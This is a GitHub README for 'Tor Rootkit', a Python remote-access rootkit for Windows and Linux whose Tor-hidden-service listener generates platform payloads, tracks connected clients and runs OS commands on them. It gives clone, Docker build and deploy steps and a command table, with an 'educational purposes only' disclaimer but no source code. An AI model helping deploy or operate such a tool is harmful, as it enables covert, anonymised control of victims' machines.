# Tor Rootkit
[![Docker build test](https://github.com/emcruise/TorRootkit/actions/workflows/docker-test.yml/badge.svg)](https://github.com/emcruise/TorRootkit/actions/workflows/docker-test.yml)

A Python 3 standalone Windows 10 / Linux Rootkit. The networking communications are established over the tor network.

This rootkit is WIP.

## Disclaimer
Use for educational purposes only.

## How to use

1. Clone the repo and change directory:
```bash
git clone https://github.com/emcruise/TorRootkit.git
```

2. Build docker container:
```bash
docker build -t listener .
```

3. Run docker container:
```bash
docker run -v $(pwd)/executables:/executables/ -it listener
```

4. Deploy the executables:
When the listener is up and running it generates a "executables" directory containing different payloads for different plattforms.
```
TorRootkit/
│    ...
└    executables/
```

## Features
- Standalone executable, including python interpreter and tor
- The executable has a size of ~13MB on Windows and ~7MB on Linux
- the whole communication works over tor hidden services which guarantees some degree of anonymity
- The Listener can handle multiple clients
- The Client auto reconnects when a unexpected closed connection occurs
- The Listener generates payloads for different plattforms on startup

## Listener Shell Commands
| Command | Explanation |
| ------- | ----------- |
| `help`  | Shows the help menu |
| `^C` or `exit` | Exits the shell |
| `list` | lists all connected clients with their according index |
| `select <index>` | start shell with client |

### Client Shell Commands
| Command | Explanation |
| ------- | ----------- |
| `help`  | Shows the help menu |
| `^C` or `exit` | Exits the client shell and returns to listener shell |
| `os <command>` | Executes a command in the clients shell and returns the output |
| `background` | Keeps the connection to a client and returns to listener

